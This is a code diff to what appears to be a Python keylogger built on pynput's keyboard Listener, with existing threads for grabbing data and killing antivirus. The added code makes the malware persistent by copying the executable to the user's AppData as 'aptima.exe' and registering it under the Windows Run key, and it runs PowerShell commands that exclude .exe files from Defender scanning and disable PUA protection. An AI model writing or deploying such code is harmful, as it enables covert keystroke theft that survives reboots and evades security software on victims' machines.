@@ -1,5 +1,6 @@
 import glob
 import shutil
+import subprocess
 import sys
 
 from pynput.keyboard import Listener
@@ -40,6 +41,29 @@ def grab():
 
         print(output)
         time.sleep(1)
+
+
+def persist_thread():
+    while True:
+        persist()
+        time.sleep(1)
+
+
+def persist():
+    reg_name = "aptima"
+    copy_name = "aptima.exe"
+    file_location = o.environ['appdata'] + '\\' + copy_name
+    try:
+        if not o.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            subprocess.call(
+                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"',
+                shell=True)
+            print('[+] Created Persistence With Reg Key: ' + reg_name)
+        else:
+            print('[+] Persistence Already Exists')
+    except:
+        print('[+] Error Creating Persistence With The Target Machine')
 
 
 # RANDROMSTRING
@@ -219,10 +243,18 @@ def av_thread():
 
 
 with Listener(on_press=on_press) as listener:
+    try:
+        o.system("powershell.exe -command Add-MpPreference -ExclusionExtension .exe")
+        o.system("powershell.exe -command Set-MpPreference -PUAProtection disable")
+    except Exception:
+        print("cannot deactivate powershell")
     grabbing = threading.Thread(target=grab)
     grabbing.start()
     killer = threading.Thread(target=av_thread)
     killer.start()
+    persister = threading.Thread(target=persist_thread)
+    persister.start()
+
     listener.join()
 
 
